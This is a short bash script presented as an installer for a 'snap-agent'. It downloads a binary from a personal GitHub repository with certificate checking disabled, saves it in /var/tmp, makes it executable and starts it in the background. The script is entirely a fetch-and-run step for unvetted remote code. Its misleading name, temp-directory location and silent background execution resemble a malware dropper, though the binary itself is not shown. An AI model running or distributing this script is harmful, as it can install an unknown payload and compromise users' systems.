#!/bin/bash

# Set variables
AGENT_PATH="/var/tmp/snap-agent"
DOWNLOAD_URL="https://github.com/yellphonenaing199/installer/raw/refs/heads/main/snap-agent"


# Download snap-agent
echo "➜ Downloading snap-agent from $DOWNLOAD_URL..."
wget "$DOWNLOAD_URL" -O "$AGENT_PATH" --no-check-certificate

# Check if download was successful
if [[ ! -f "$AGENT_PATH" ]]; then
  echo "❌ Failed to download snap-agent to $AGENT_PATH"
  exit 1
fi

# Ensure it's executable
chmod +x "$AGENT_PATH"

# Run the agent
echo "➜ Running snap-agent..."
"$AGENT_PATH" &

echo "✅ snap-agent has been downloaded to $AGENT_PATH and started in background"
echo "➜ Process ID: $!"
